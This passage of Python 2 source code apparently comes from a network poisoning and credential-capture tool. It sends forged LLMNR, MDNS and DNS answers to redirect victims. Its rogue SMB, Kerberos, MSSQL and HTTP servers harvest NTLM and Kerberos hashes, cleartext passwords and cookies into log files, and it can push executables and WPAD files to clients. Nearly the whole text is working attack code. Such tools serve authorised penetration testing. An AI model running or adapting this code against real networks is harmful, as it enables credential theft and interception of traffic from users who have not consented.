					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					packet1 = str(head)+str(SMBSessEmpty())
					buffer1 = longueur(packet1)+packet1
					self.request.send(buffer1)
					data = self.request.recv(1024)

		except Exception:
			self.request.close()
			pass


##################################################################################
#Kerberos Server
##################################################################################
def ParseMSKerbv5TCP(Data):
	MsgType = Data[21:22]
	EncType = Data[43:44]
	MessageType = Data[32:33]
	if MsgType == "\x0a" and EncType == "\x17" and MessageType =="\x02":
		if Data[49:53] == "\xa2\x36\x04\x34" or Data[49:53] == "\xa2\x35\x04\x33":
			HashLen = struct.unpack('<b',Data[50:51])[0]
			if HashLen == 54:
				Hash = Data[53:105]
				SwitchHash = Hash[16:]+Hash[0:16]
				NameLen = struct.unpack('<b',Data[153:154])[0]
				Name = Data[154:154+NameLen]
				DomainLen = struct.unpack('<b',Data[154+NameLen+3:154+NameLen+4])[0]
				Domain = Data[154+NameLen+4:154+NameLen+4+DomainLen]
				BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
				return BuildHash
		if Data[44:48] == "\xa2\x36\x04\x34" or Data[44:48] == "\xa2\x35\x04\x33":
			HashLen = struct.unpack('<b',Data[45:46])[0]
			if HashLen == 53:
				Hash = Data[48:99]
				SwitchHash = Hash[16:]+Hash[0:16]
				NameLen = struct.unpack('<b',Data[147:148])[0]
				Name = Data[148:148+NameLen]
				DomainLen = struct.unpack('<b',Data[148+NameLen+3:148+NameLen+4])[0]
				Domain = Data[148+NameLen+4:148+NameLen+4+DomainLen]
				BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
				return BuildHash
			if HashLen == 54:
				Hash = Data[53:105]
				SwitchHash = Hash[16:]+Hash[0:16]
				NameLen = struct.unpack('<b',Data[148:149])[0]
				Name = Data[149:149+NameLen]
				DomainLen = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
				Domain = Data[149+NameLen+4:149+NameLen+4+DomainLen]
				BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
				return BuildHash

		else:
			Hash = Data[48:100]
			SwitchHash = Hash[16:]+Hash[0:16]
			NameLen = struct.unpack('<b',Data[148:149])[0]
			Name = Data[149:149+NameLen]
			DomainLen = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
			Domain = Data[149+NameLen+4:149+NameLen+4+DomainLen]
			BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
			return BuildHash
	else:
		return False

def ParseMSKerbv5UDP(Data):
	MsgType = Data[17:18]
	EncType = Data[39:40]
	if MsgType == "\x0a" and EncType == "\x17":
		if Data[40:44] == "\xa2\x36\x04\x34" or Data[40:44] == "\xa2\x35\x04\x33":
			HashLen = struct.unpack('<b',Data[41:42])[0]
			if HashLen == 54:
				Hash = Data[44:96]
				SwitchHash = Hash[16:]+Hash[0:16]
				NameLen = struct.unpack('<b',Data[144:145])[0]
				Name = Data[145:145+NameLen]
				DomainLen = struct.unpack('<b',Data[145+NameLen+3:145+NameLen+4])[0]
				Domain = Data[145+NameLen+4:145+NameLen+4+DomainLen]
				BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
				return BuildHash
			if HashLen == 53:
				Hash = Data[44:95]
				SwitchHash = Hash[16:]+Hash[0:16]
				NameLen = struct.unpack('<b',Data[143:144])[0]
				Name = Data[144:144+NameLen]
				DomainLen = struct.unpack('<b',Data[144+NameLen+3:144+NameLen+4])[0]
				Domain = Data[144+NameLen+4:144+NameLen+4+DomainLen]
				BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
				return BuildHash


		else:
			Hash = Data[49:101]
			SwitchHash = Hash[16:]+Hash[0:16]
			NameLen = struct.unpack('<b',Data[149:150])[0]
			Name = Data[150:150+NameLen]
			DomainLen = struct.unpack('<b',Data[150+NameLen+3:150+NameLen+4])[0]
			Domain = Data[150+NameLen+4:150+NameLen+4+DomainLen]
			BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
			return BuildHash
	else:
		return False

class KerbTCP(BaseRequestHandler):

	def handle(self):
		try:
			data = self.request.recv(1024)
			KerbHash = ParseMSKerbv5TCP(data)
			if KerbHash:
				Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
				if PrintData(Outfile,KerbHash):
					#print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
					#print "[+]MSKerbv5 complete hash is :", KerbHash
					Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
					WriteData(Outfile,KerbHash, KerbHash)
					responder_logger.info('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
		except Exception:
			raise

class KerbUDP(BaseRequestHandler):

	def handle(self):
		try:
			data, soc = self.request
			KerbHash = ParseMSKerbv5UDP(data)
			if KerbHash:
				Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
				if PrintData(Outfile,KerbHash):
					#print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
					#print "[+]MSKerbv5 complete hash is :", KerbHash
					Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
					WriteData(Outfile,KerbHash, KerbHash)
					responder_logger.info('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
		except Exception:
			raise

##################################################################################
#SQL Stuff
##################################################################################

#This function parse SQL NTLMv1/v2 hash and dump it into a specific file.
def ParseSQLHash(data,client):
	SSPIStart = data[8:]
	LMhashLen = struct.unpack('<H',data[20:22])[0]
	LMhashOffset = struct.unpack('<H',data[24:26])[0]
	LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
	NthashLen = struct.unpack('<H',data[30:32])[0]
	if NthashLen == 24:
		NthashOffset = struct.unpack('<H',data[32:34])[0]
		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainLen = struct.unpack('<H',data[36:38])[0]
		DomainOffset = struct.unpack('<H',data[40:42])[0]
		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[44:46])[0]
		UserOffset = struct.unpack('<H',data[48:50])[0]
		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		outfile = "./logs/responder/MSSQL-NTLMv1-Client-"+client+".txt"
		if PrintData(outfile,User+"::"+Domain):
			#print "[+]MSSQL NTLMv1 hash captured from :",client
			#print '[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
			WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal, User+"::"+Domain)
		responder_logger.info('[+]MsSQL NTLMv1 hash captured from :%s'%(client))
		responder_logger.info('[+]MSSQL NTLMv1 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
		responder_logger.info('[+]MSSQL NTLMv1 Domain is :%s'%(Domain))
		responder_logger.info('[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal))
	if NthashLen > 60:
		DomainLen = struct.unpack('<H',data[36:38])[0]
		NthashOffset = struct.unpack('<H',data[32:34])[0]
		NthashLen = struct.unpack('<H',data[30:32])[0]
		Hash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainOffset = struct.unpack('<H',data[40:42])[0]
		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[44:46])[0]
		UserOffset = struct.unpack('<H',data[48:50])[0]
		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		outfile = "./logs/responder/MSSQL-NTLMv2-Client-"+client+".txt"
		Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
		if PrintData(outfile,User+"::"+Domain):
			#print "[+]MSSQL NTLMv2 Hash captured from :",client
			#print "[+]MSSQL NTLMv2 Complete Hash is : ", Writehash
			WriteData(outfile,Writehash,User+"::"+Domain)
		responder_logger.info('[+]MsSQL NTLMv2 hash captured from :%s'%(client))
		responder_logger.info('[+]MSSQL NTLMv2 Domain is :%s'%(Domain))
		responder_logger.info('[+]MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
		responder_logger.info('[+]MSSQL NTLMv2 Complete Hash is : %s'%(Writehash))

def ParseSqlClearTxtPwd(Pwd):
	Pwd = map(ord,Pwd.replace('\xa5',''))
	Pw = []
	for x in Pwd:
		Pw.append(hex(x ^ 0xa5)[::-1][:2].replace("x","0").decode('hex'))
	return ''.join(Pw)

def ParseClearTextSQLPass(Data,client):
	outfile = "./logs/responder/MSSQL-PlainText-Password-"+client+".txt"
	UsernameOffset = struct.unpack('<h',Data[48:50])[0]
	PwdOffset = struct.unpack('<h',Data[52:54])[0]
	AppOffset = struct.unpack('<h',Data[56:58])[0]
	PwdLen = AppOffset-PwdOffset
	UsernameLen = PwdOffset-UsernameOffset
	PwdStr = ParseSqlClearTxtPwd(Data[8+PwdOffset:8+PwdOffset+PwdLen])
	UserName = Data[8+UsernameOffset:8+UsernameOffset+UsernameLen].decode('utf-16le')
	if PrintData(outfile,UserName+":"+PwdStr):
		#print "[+]MSSQL PlainText Password captured from :",client
		#print "[+]MSSQL Username: %s Password: %s"%(UserName, PwdStr)
		WriteData(outfile,UserName+":"+PwdStr,UserName+":"+PwdStr)
	responder_logger.info('[+]MSSQL PlainText Password captured from :%s'%(client))
	responder_logger.info('[+]MSSQL Username: %s Password: %s'%(UserName, PwdStr))


def ParsePreLoginEncValue(Data):
	PacketLen = struct.unpack('>H',Data[2:4])[0]
	EncryptionValue = Data[PacketLen-7:PacketLen-6]
	if re.search("NTLMSSP",Data):
		return True
	else:
		return False

#MS-SQL server class.
class MSSQL(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				data = self.request.recv(1024)
				self.request.settimeout(0.1)
				##Pre-Login Message
				if data[0] == "\x12":
					buffer0 = str(MSSQLPreLoginAnswer())
					self.request.send(buffer0)
					data = self.request.recv(1024)
				##NegoSSP
				if data[0] == "\x10":
					if re.search("NTLMSSP",data):
						t = MSSQLNTLMChallengeAnswer(ServerChallenge=Challenge)
						t.calculate()
						buffer1 = str(t)
						self.request.send(buffer1)
						data = self.request.recv(1024)
					else:
						ParseClearTextSQLPass(data,self.client_address[0])
					##NegoSSP Auth
				if data[0] == "\x11":
					ParseSQLHash(data,self.client_address[0])
		except Exception:
			pass
			self.request.close()

##################################################################################
#LLMNR Stuff
##################################################################################

#LLMNR Answer packet.
class LLMNRAns(Packet):
	fields = OrderedDict([
		("Tid",              ""),
		("Flags",            "\x80\x00"),
		("Question",         "\x00\x01"),
		("AnswerRRS",        "\x00\x01"),
		("AuthorityRRS",     "\x00\x00"),
		("AdditionalRRS",    "\x00\x00"),
		("QuestionNameLen",  "\x09"),
		("QuestionName",     ""),
		("QuestionNameNull", "\x00"),
		("Type",             "\x00\x01"),
		("Class",            "\x00\x01"),
		("AnswerNameLen",    "\x09"),
		("AnswerName",       ""),
		("AnswerNameNull",   "\x00"),
		("Type1",            "\x00\x01"),
		("Class1",           "\x00\x01"),
		("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
		("IPLen",            "\x00\x04"),
		("IP",               "\x00\x00\x00\x00"),
	])

	def calculate(self):
		self.fields["IP"] = inet_aton(OURIP)
		self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))
		self.fields["AnswerNameLen"] = struct.pack(">h",len(self.fields["AnswerName"]))[1]
		self.fields["QuestionNameLen"] = struct.pack(">h",len(self.fields["QuestionName"]))[1]

def Parse_LLMNR_Name(data):
	NameLen = struct.unpack('>B',data[12])[0]
	Name = data[13:13+NameLen]
	return Name

def Parse_IPV6_Addr(data):
	if data[len(data)-4:len(data)][1] =="\x1c":
		return False
	if data[len(data)-4:len(data)] == "\x00\x01\x00\x01":
		return True
	if data[len(data)-4:len(data)] == "\x00\xff\x00\x01":
		return True
	else:
		return False

def IsOnTheSameSubnet(ip, net):
	net = net+'/24'
	ipaddr = int(''.join([ '%02x' % int(x) for x in ip.split('.') ]), 16)
	netstr, bits = net.split('/')
	netaddr = int(''.join([ '%02x' % int(x) for x in netstr.split('.') ]), 16)
	mask = (0xffffffff << (32 - int(bits))) & 0xffffffff
	return (ipaddr & mask) == (netaddr & mask)

def FindLocalIP(Iface):
	return OURIP

# LLMNR Server class.
class LLMNR(BaseRequestHandler):

	def handle(self):
		data, soc = self.request
		try:
			if data[2:4] == "\x00\x00":
				if Parse_IPV6_Addr(data):
					Name = Parse_LLMNR_Name(data)
					if Analyze(AnalyzeMode):
						if Is_Finger_On(Finger_On_Off):
							try:
								Finger = RunSmbFinger((self.client_address[0],445))
								Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s.\nOs Version is: %s Client Version is: %s"%(self.client_address[0], Name,Finger[0],Finger[1])
								logger3.warning(Message)
							except Exception:
								Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
								logger3.warning(Message)
								if PrintLLMNRNBTNS(AnalyzeFilename,Message):
									print Message
						else:
							Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
							if PrintLLMNRNBTNS(AnalyzeFilename,Message):
								#print Message
								logger3.warning(Message)

					if DontRespondToSpecificHost(DontRespondTo):
						if RespondToIPScope(DontRespondTo, self.client_address[0]):
							return None

					if DontRespondToSpecificName(DontRespondToName) and DontRespondToNameScope(DontRespondToName.upper(), Name.upper()):
						return None 

					if RespondToSpecificHost(RespondTo):
						if Analyze(AnalyzeMode) == False:
							if RespondToIPScope(RespondTo, self.client_address[0]):
								if RespondToSpecificName(RespondToName) == False:
									buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
									buff.calculate()
									for x in range(1):
										soc.sendto(str(buff), self.client_address)
										Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
										responder_logger.info(Message)
										if PrintLLMNRNBTNS(Log2Filename,Message):
											#print Message
											logger2.warning(Message)
										if Is_Finger_On(Finger_On_Off):
											try:
												Finger = RunSmbFinger((self.client_address[0],445))
												#print '[+] OsVersion is:%s'%(Finger[0])
												#print '[+] ClientVersion is :%s'%(Finger[1])
												responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
												responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
											except Exception:
												responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
												pass

								if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
									buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
									buff.calculate()
									for x in range(1):
										soc.sendto(str(buff), self.client_address)
										Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
										responder_logger.info(Message)
										if PrintLLMNRNBTNS(Log2Filename,Message):
											#print Message
											logger2.warning(Message)
										if Is_Finger_On(Finger_On_Off):
											try:
												Finger = RunSmbFinger((self.client_address[0],445))
												#print '[+] OsVersion is:%s'%(Finger[0])
												#print '[+] ClientVersion is :%s'%(Finger[1])
												responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
												responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
											except Exception:
												responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
												pass

					if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
						if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
							buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
							buff.calculate()
							Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
							for x in range(1):
								soc.sendto(str(buff), self.client_address)
							if PrintLLMNRNBTNS(Log2Filename,Message):
								#print Message
								logger2.warning(Message)
							if Is_Finger_On(Finger_On_Off):
								try:
									Finger = RunSmbFinger((self.client_address[0],445))
									#print '[+] OsVersion is:%s'%(Finger[0])
									#print '[+] ClientVersion is :%s'%(Finger[1])
									responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
									responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
								except Exception:
									responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
									pass
						if RespondToSpecificName(RespondToName) == False:
							 buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
							 buff.calculate()
							 Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
							 for x in range(1):
								 soc.sendto(str(buff), self.client_address)
							 if PrintLLMNRNBTNS(Log2Filename,Message):
								 #print Message
								 logger2.warning(Message)
							 if Is_Finger_On(Finger_On_Off):
								 try:
									 Finger = RunSmbFinger((self.client_address[0],445))
									 #print '[+] OsVersion is:%s'%(Finger[0])
									 #print '[+] ClientVersion is :%s'%(Finger[1])
									 responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
									 responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
								 except Exception:
									 responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
									 pass
						else:
							pass
			else:
				pass
		except:
			raise

##################################################################################
#DNS Stuff
##################################################################################
def ParseDNSType(data):
	QueryTypeClass = data[len(data)-4:]
	if QueryTypeClass == "\x00\x01\x00\x01":#If Type A, Class IN, then answer.
		return True
	else:
		return False

#DNS Answer packet.
class DNSAns(Packet):
	fields = OrderedDict([
		("Tid",              ""),
		("Flags",            "\x80\x10"),
		("Question",         "\x00\x01"),
		("AnswerRRS",        "\x00\x01"),
		("AuthorityRRS",     "\x00\x00"),
		("AdditionalRRS",    "\x00\x00"),
		("QuestionName",     ""),
		("QuestionNameNull", "\x00"),
		("Type",             "\x00\x01"),
		("Class",            "\x00\x01"),
		("AnswerPointer",    "\xc0\x0c"),
		("Type1",            "\x00\x01"),
		("Class1",           "\x00\x01"),
		("TTL",              "\x00\x00\x00\x1e"), #30 secs, dont mess with their cache for too long..
		("IPLen",            "\x00\x04"),
		("IP",               "\x00\x00\x00\x00"),
	])

	def calculate(self,data):
		self.fields["Tid"] = data[0:2]
		self.fields["QuestionName"] = ''.join(data[12:].split('\x00')[:1])
		self.fields["IP"] = inet_aton(OURIP)
		self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))

# DNS Server class.
class DNS(BaseRequestHandler):

	def handle(self):
		data, soc = self.request
		if self.client_address[0] == "127.0.0.1":
			pass
		elif ParseDNSType(data):
			buff = DNSAns()
			buff.calculate(data)
			soc.sendto(str(buff), self.client_address)
			#print "DNS Answer sent to: %s "%(self.client_address[0])
			responder_logger.info('DNS Answer sent to: %s'%(self.client_address[0]))

class DNSTCP(BaseRequestHandler):

	def handle(self):
		try:
			data = self.request.recv(1024)
			if self.client_address[0] == "127.0.0.1":
				pass
			elif ParseDNSType(data):
				buff = DNSAns()
				buff.calculate(data)
				self.request.send(str(buff))
				#print "DNS Answer sent to: %s "%(self.client_address[0])
				responder_logger.info('DNS Answer sent to: %s'%(self.client_address[0]))

		except Exception:
			pass


##################################################################################
#MDNS Stuff
##################################################################################
class MDNSAns(Packet):
	fields = OrderedDict([
		("Tid",              "\x00\x00"),
		("Flags",            "\x84\x00"),
		("Question",         "\x00\x00"),
		("AnswerRRS",        "\x00\x01"),
		("AuthorityRRS",     "\x00\x00"),
		("AdditionalRRS",    "\x00\x00"),
		("AnswerName",       ""),
		("AnswerNameNull",   "\x00"),
		("Type",             "\x00\x01"),
		("Class",            "\x00\x01"),
		("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn.
		("IPLen",            "\x00\x04"),
		("IP",               "\x00\x00\x00\x00"),
	])

	def calculate(self):
		self.fields["IP"] = inet_aton(OURIP)
		self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))

def Parse_MDNS_Name(data):
	data = data[12:]
	NameLen = struct.unpack('>B',data[0])[0]
	Name = data[1:1+NameLen]
	NameLen_ = struct.unpack('>B',data[1+NameLen])[0]
	Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
	return Name+'.'+Name_

def Poisoned_MDNS_Name(data):
	data = data[12:]
	Name = data[:len(data)-5]
	return Name

class MDNS(BaseRequestHandler):

	def handle(self):
		MADDR = "224.0.0.251"
		MPORT = 5353
		data, soc = self.request
		if self.client_address[0] == "127.0.0.1":
			pass
		try:
			if Analyze(AnalyzeMode):
				if Parse_IPV6_Addr(data):
					#print '[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data))
					responder_logger.info('[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data)))

			if RespondToSpecificHost(RespondTo):
				if Analyze(AnalyzeMode) == False:
					if RespondToIPScope(RespondTo, self.client_address[0]):
						if Parse_IPV6_Addr(data):
							#print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
							responder_logger.info('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
							Name = Poisoned_MDNS_Name(data)
							MDns = MDNSAns(AnswerName = Name)
							MDns.calculate()
							soc.sendto(str(MDns),(MADDR,MPORT))

			if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
				if Parse_IPV6_Addr(data):
					#print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
					responder_logger.info('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
					Name = Poisoned_MDNS_Name(data)
					MDns = MDNSAns(AnswerName = Name)
					MDns.calculate()
					soc.sendto(str(MDns),(MADDR,MPORT))
			else:
				pass
		except Exception:
			raise

##################################################################################
#HTTP Stuff
##################################################################################

#Parse NTLMv1/v2 hash.
def ParseHTTPHash(data,client):
	LMhashLen = struct.unpack('<H',data[12:14])[0]
	LMhashOffset = struct.unpack('<H',data[16:18])[0]
	LMHash = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
	NthashLen = struct.unpack('<H',data[20:22])[0]
	NthashOffset = struct.unpack('<H',data[24:26])[0]
	NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
	if NthashLen == 24:
		NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		HostNameLen = struct.unpack('<H',data[46:48])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[36:38])[0]
		UserOffset = struct.unpack('<H',data[40:42])[0]
		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
		outfile = "./logs/responder/HTTP-NTLMv1-Client-"+client+".txt"
		WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
		if PrintData(outfile,User+"::"+Hostname):
			#print "[+]HTTP NTLMv1 hash captured from :",client
			#print "Hostname is :", Hostname
			#print "Complete hash is : ", WriteHash
			WriteData(outfile,WriteHash, User+"::"+Hostname)
		responder_logger.info('[+]HTTP NTLMv1 hash captured from :%s'%(client))
		responder_logger.info('[+]HTTP NTLMv1 Hostname is :%s'%(Hostname))
		responder_logger.info('[+]HTTP NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
		responder_logger.info('[+]HTTP NTLMv1 Complete hash is :%s'%(WriteHash))

	if NthashLen > 24:
		NthashLen = 64
		DomainLen = struct.unpack('<H',data[28:30])[0]
		DomainOffset = struct.unpack('<H',data[32:34])[0]
		Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[36:38])[0]
		UserOffset = struct.unpack('<H',data[40:42])[0]
		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
		HostNameLen = struct.unpack('<H',data[44:46])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		outfile = "./logs/responder/HTTP-NTLMv2-Client-"+client+".txt"
		WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
		if PrintData(outfile,User+"::"+Domain):
			#print "[+]HTTP NTLMv2 hash captured from :",client
			#print "Complete hash is : ", WriteHash
			WriteData(outfile,WriteHash, User+"::"+Domain)
		responder_logger.info('[+]HTTP NTLMv2 hash captured from :%s'%(client))
		responder_logger.info('[+]HTTP NTLMv2 User is : %s'%(User))
		responder_logger.info('[+]HTTP NTLMv2 Domain is :%s'%(Domain))
		responder_logger.info('[+]HTTP NTLMv2 Hostname is :%s'%(HostName))
		responder_logger.info('[+]HTTP NTLMv2 Complete hash is :%s'%(WriteHash))

def GrabCookie(data,host):
	Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)
	if Cookie:
		CookieStr = "[+]HTTP Cookie Header sent from: %s The Cookie is: \n%s"%(host,Cookie.group(0))
		responder_logger.info(CookieStr)
		return Cookie.group(0)
	else:
		NoCookies = "No cookies were sent with this request"
		responder_logger.info(NoCookies)
		return NoCookies

def WpadCustom(data,client):
	Wpad = re.search('(/wpad.dat|/*\.pac)', data)
	if Wpad:
		buffer1 = WPADScript(Payload=WPAD_Script)
		buffer1.calculate()
		return str(buffer1)
	else:
		return False

def WpadForcedAuth(Force_WPAD_Auth):
	if Force_WPAD_Auth == True:
		return True
	if Force_WPAD_Auth == False:
		return False

# Function used to check if we answer with a Basic or NTLM auth.
def Basic_Ntlm(Basic):
	if Basic == True:
		return IIS_Basic_401_Ans()
	else:
		return IIS_Auth_401_Ans()

def ServeEXE(data,client, Filename):
	Message = "[+]Sent %s file sent to: %s."%(Filename,client)
	responder_logger.info(Message)
	with open (Filename, "rb") as bk:
		data = bk.read()
		bk.close()
		return data

def ServeEXEOrNot(on_off):
	if Exe_On_Off == "ON":
		return True
	if Exe_On_Off == "OFF":
		return False

def ServeEXECAlwaysOrNot(on_off):
	if Exec_Mode_On_Off == "ON":
		return True
	if Exec_Mode_On_Off == "OFF":
		return False

def IsExecutable(Filename):
	exe = re.findall('.exe',Filename)
	if exe:
		return True
	else:
		return False

def GrabURL(data, host):
	GET = re.findall('(?<=GET )[^HTTP]*', data)
	POST = re.findall('(?<=POST )[^HTTP]*', data)
	POSTDATA = re.findall('(?<=\r\n\r\n)[^*]*', data)
	if GET:
		HostStr = "[+]HTTP GET request from : %s. The HTTP URL requested was: %s"%(host, ''.join(GET))
		responder_logger.info(HostStr)
		#print HostStr

	if POST:
		Host3Str = "[+]HTTP POST request from : %s. The HTTP URL requested was: %s"%(host,''.join(POST))
		responder_logger.info(Host3Str)
		#print Host3Str
		if len(''.join(POSTDATA)) >2:
			PostData = '[+]The HTTP POST DATA in this request was: %s'%(''.join(POSTDATA).strip())
			#print PostData
			responder_logger.info(PostData)

#Handle HTTP packet sequence.
def PacketSequence(data,client):
	Ntlm = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
	BasicAuth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)

	if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
		File = config.get('HTTP Server', 'ExecFilename')
		buffer1 = ServerExeFile(Payload = ServeEXE(data,client,File),filename=File)
		buffer1.calculate()
		return str(buffer1)

	if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
		if IsExecutable(FILENAME):
			buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,FILENAME),ContentDiFile=FILENAME)
			buffer1.calculate()
			return str(buffer1)
		else:
			buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
			buffer1.calculate()
			return str(buffer1)

	if Ntlm:
		packetNtlm = b64decode(''.join(Ntlm))[8:9]
		if packetNtlm == "\x01":
			GrabURL(data,client)
			GrabCookie(data,client)
			r = NTLM_Challenge(ServerChallenge=Challenge)
			r.calculate()
			t = IIS_NTLM_Challenge_Ans()
			t.calculate(str(r))
			buffer1 = str(t)
			return buffer1
		if packetNtlm == "\x03":
			NTLM_Auth= b64decode(''.join(Ntlm))
			ParseHTTPHash(NTLM_Auth,client)
			if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
				Message = "[+]WPAD (auth) file sent to: %s"%(client)
				if Verbose:
					print Message
				responder_logger.info(Message)
				buffer1 = WpadCustom(data,client)
				return buffer1
			else:
				buffer1 = IIS_Auth_Granted(Payload=HTMLToServe)
				buffer1.calculate()
				return str(buffer1)

	if BasicAuth:
		GrabCookie(data,client)
		GrabURL(data,client)
		outfile = "./logs/responder/HTTP-Clear-Text-Password-"+client+".txt"
		if PrintData(outfile,b64decode(''.join(BasicAuth))):
			#print "[+]HTTP-User & Password:", b64decode(''.join(BasicAuth))
			WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
		responder_logger.info('[+]HTTP-User & Password: %s'%(b64decode(''.join(BasicAuth))))
		if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
			Message = "[+]WPAD (auth) file sent to: %s"%(client)
			if Verbose:
				print Message
			responder_logger.info(Message)
			buffer1 = WpadCustom(data,client)
			return buffer1
		else:
